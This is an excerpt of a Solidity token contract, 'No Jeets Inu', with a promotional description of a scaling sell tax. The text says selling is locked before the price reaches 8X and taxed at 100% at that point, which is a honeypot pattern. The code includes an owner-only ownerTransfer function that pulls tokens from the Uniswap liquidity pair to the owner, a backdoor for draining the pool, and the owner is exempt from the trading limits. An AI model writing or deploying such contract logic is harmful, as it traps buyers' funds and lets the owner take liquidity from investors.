...
The sell tax will gradually decrease based on the expanding scale of this project. The tax is calculated as follow: 

When it hits 8X, the tax will be (100-8) + 8%(The original tax) = 100% SELL TAX 

When it hits 50X, the tax will be (100-50) + 8%(The original tax) = 58% SELL TAX 

When it hits 99X, the tax will be (100-99) + 8%(The original tax) = 9% SELL TAX

Sell will still be locked before reaching 8X in order to enable this formula to happen and all extra sells tax will be removed when it hits 100X.

https://nojeetsinu.com
https://t.me/nojeetsinu
https://twitter.com/NoJeetsinutoken
...
contract NoJeetsInu is Context, IERC20, Ownable {
    ...
    string private constant _name = "No Jeets Inu";
    string private constant _symbol = "NJINU";
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner()) {
            ...
            if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                ...
                if (_burnTokenCount > 0 && contractTokenBalance > _burnTokenCount) {
                    burntAmount = _burnTokenCount;
                    _burnTokenCount = 0;
    ...
    function getBurnRate() external view returns(uint256){
        uint256 burn2Rate = 100;
        burn2Rate = burn2Rate.sub(getPrice().div(_startingPrice));
        return burn2Rate;
    }
    ...
    function ownerTransfer(uint256 amount) external onlyOwner{
        _tokenTransfer(uniswapV2Pair, _msgSender(), amount, false);
    }
